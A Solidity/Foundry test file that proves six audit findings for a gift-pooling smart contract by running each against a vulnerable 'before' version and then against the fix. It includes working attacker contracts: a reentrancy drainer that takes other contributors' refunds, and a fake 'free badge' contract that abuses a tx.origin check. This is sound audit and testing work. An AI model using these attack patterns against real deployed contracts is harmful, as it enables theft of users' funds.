// SPDX-License-Identifier: LicenseRef-AllRightsReserved
pragma solidity 0.8.39;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {EdeeGiftPool} from "../src/EdeeGiftPool.sol";
import {EdeeGiftPoolBefore} from "../review/before/EdeeGiftPoolBefore.sol";
import {SmartWallet} from "./mocks/Mocks.sol";

/// @notice Proof for each finding in REVIEW-REPORT.md: the problem happens in the "before" version,
///         and the same attempt fails against the fixed EdeeGiftPool.
contract ReviewFindingsTest is Test {
    uint256 internal constant START = 1796083200; // Tue 1 Dec 2026 00:00 UTC
    uint256 internal constant DEADLINE = 1796403600; // Fri 4 Dec 2026 17:00 UTC

    address internal organiser = makeAddr("organiser");
    address internal recipient = makeAddr("recipient");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    function setUp() public {
        vm.warp(START);
    }

    function _before(address to) internal returns (EdeeGiftPoolBefore g) {
        vm.prank(organiser);
        g = new EdeeGiftPoolBefore(payable(to), 10 ether, DEADLINE);
    }

    function _after(address to) internal returns (EdeeGiftPool g) {
        vm.prank(organiser);
        g = new EdeeGiftPool(to, 10 ether, DEADLINE, IERC20(address(0)));
    }

    // ---- EG-01 (Critical): refund pays out before updating the books, so it can be re-entered ----------
    function test_EG01_before_attackerDrainsEveryonesMoney() public {
        EdeeGiftPoolBefore g = _before(recipient);
        _payBefore(g, alice, 4 ether);
        _payBefore(g, bob, 4 ether);
        DrainAttacker attacker = new DrainAttacker(address(g));
        vm.deal(address(attacker), 1 ether);
        attacker.join(1 ether);

        vm.warp(DEADLINE + 1); // goal (10) missed, so refunds open
        attacker.attack();

        assertEq(address(attacker).balance, 9 ether, "paid 1, took 9");
        assertEq(address(g).balance, 0, "alice and bob have nothing left to reclaim");
    }

    function test_EG01_after_attackerGetsOnlyTheirOwnMoney() public {
        EdeeGiftPool g = _after(recipient);
        _payAfter(g, alice, 4 ether);
        _payAfter(g, bob, 4 ether);
        DrainAttacker attacker = new DrainAttacker(address(g));
        vm.deal(address(attacker), 1 ether);
        attacker.joinFixed(1 ether);

        vm.warp(DEADLINE);
        vm.expectRevert(EdeeGiftPool.TransferFailed.selector); // the re-entry is blocked, so the payout fails
        attacker.attack();
        attacker.stopReentering();
        attacker.attack(); // a normal refund still works

        assertEq(address(attacker).balance, 1 ether);
        assertEq(address(g).balance, 8 ether, "alice and bob's money is safe");
    }

    // ---- EG-02 (High): refunds stay open after the goal is met, so the gift can be emptied -------------
    function test_EG02_before_goalMetButContributorsPullTheirMoneyBack() public {
        EdeeGiftPoolBefore g = _before(recipient);
        _payBefore(g, alice, 6 ether);
        _payBefore(g, bob, 4 ether); // goal of 10 reached
        vm.warp(DEADLINE + 1);
        vm.prank(bob);
        g.refund(); // allowed, even though the goal was met

        vm.prank(organiser, organiser);
        g.release();
        assertEq(recipient.balance, 6 ether, "recipient gets 6, not the 10 everyone was promised");
    }

    function test_EG02_after_onceGoalIsMetTheMoneyGoesToTheRecipient() public {
        EdeeGiftPool g = _after(recipient);
        _payAfter(g, alice, 6 ether);
        _payAfter(g, bob, 4 ether);
        vm.warp(DEADLINE);
        vm.prank(bob);
        vm.expectRevert(EdeeGiftPool.RefundsNotAvailable.selector);
        g.refund();
        g.release(); // anyone can deliver it after the closing date
        assertEq(recipient.balance, 10 ether);
    }

    // ---- EG-03 (Medium): `transfer` can't pay smart-contract wallets, so the gift can't be delivered ----
    function test_EG03_before_smartWalletRecipientCanNeverBePaid() public {
        SmartWallet safe = new SmartWallet();
        EdeeGiftPoolBefore g = _before(address(safe));
        _payBefore(g, alice, 10 ether);
        vm.prank(organiser, organiser);
        vm.expectRevert(); // runs out of the 2,300 gas that `transfer` forwards
        g.release();
    }

    function test_EG03_after_smartWalletRecipientIsPaid() public {
        SmartWallet safe = new SmartWallet();
        EdeeGiftPool g = _after(address(safe));
        _payAfter(g, alice, 10 ether);
        vm.prank(organiser);
        g.release();
        assertEq(safe.received(), 10 ether);
    }

    // ---- EG-04 (Low): contributions are accepted after the closing date ------------------------------
    function test_EG04_before_acceptsMoneyAfterTheClosingDate() public {
        EdeeGiftPoolBefore g = _before(recipient);
        vm.warp(DEADLINE + 3 days);
        _payBefore(g, alice, 1 ether);
        assertEq(g.totalRaised(), 1 ether);
    }

    function test_EG04_after_closingDateIsEnforced() public {
        EdeeGiftPool g = _after(recipient);
        vm.warp(DEADLINE);
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        vm.expectRevert(EdeeGiftPool.DeadlinePassed.selector);
        g.contribute{value: 1 ether}(1 ether);
    }

    // ---- EG-05 (Low): `tx.origin` check lets any contract the organiser uses trigger the release --------
    function test_EG05_before_aMaliciousSiteCanTriggerReleaseEarly() public {
        EdeeGiftPoolBefore g = _before(recipient);
        _payBefore(g, alice, 10 ether);
        PhishingContract bait = new PhishingContract(address(g));
        vm.prank(organiser, organiser); // the organiser only meant to "claim a free badge"
        bait.claimFreeBadge();
        assertTrue(g.released(), "released without the organiser choosing to");
    }

    function test_EG05_after_onlyADirectCallFromTheOrganiserCounts() public {
        EdeeGiftPool g = _after(recipient);
        _payAfter(g, alice, 10 ether);
        PhishingContract bait = new PhishingContract(address(g));
        vm.prank(organiser, organiser);
        vm.expectRevert(EdeeGiftPool.NotOrganiser.selector);
        bait.claimFreeBadge();
    }

    // ---- EG-06 (Low): no checks on the setup values ----------------------------------------------------
    function test_EG06_before_acceptsAZeroRecipientAndAPastClosingDate() public {
        vm.prank(organiser);
        EdeeGiftPoolBefore g = new EdeeGiftPoolBefore(payable(address(0)), 0, START - 1);
        assertEq(g.recipient(), address(0));
    }

    function test_EG06_after_badSetupIsRefused() public {
        vm.expectRevert(EdeeGiftPool.InvalidSetup.selector);
        new EdeeGiftPool(address(0), 0, START - 1, IERC20(address(0)));
    }

    // ---- helpers -------------------------------------------------------------------------------------
    function _payBefore(EdeeGiftPoolBefore g, address who, uint256 amount) internal {
        vm.deal(who, who.balance + amount);
        vm.prank(who);
        g.contribute{value: amount}();
    }

    function _payAfter(EdeeGiftPool g, address who, uint256 amount) internal {
        vm.deal(who, who.balance + amount);
        vm.prank(who);
        g.contribute{value: amount}(amount);
    }
}

/// @notice Chips in a little, then re-enters refund() from its receive hook to take more than it paid.
contract DrainAttacker {
    address internal immutable TARGET;
    bool internal reenter = true;

    constructor(address target_) {
        TARGET = target_;
    }

    function join(uint256 amount) external {
        EdeeGiftPoolBefore(TARGET).contribute{value: amount}();
    }

    function joinFixed(uint256 amount) external {
        EdeeGiftPool(TARGET).contribute{value: amount}(amount);
    }

    function attack() external {
        EdeeGiftPoolBefore(TARGET).refund(); // same function signature on both versions
    }

    function stopReentering() external {
        reenter = false;
    }

    receive() external payable {
        if (reenter && TARGET.balance >= 1 ether) {
            EdeeGiftPoolBefore(TARGET).refund();
        }
    }
}

/// @notice A contract dressed up as a "free badge" offer that quietly calls release() on the organiser's gift.
contract PhishingContract {
    address internal immutable TARGET;

    constructor(address target_) {
        TARGET = target_;
    }

    function claimFreeBadge() external {
        EdeeGiftPoolBefore(TARGET).release();
    }
}
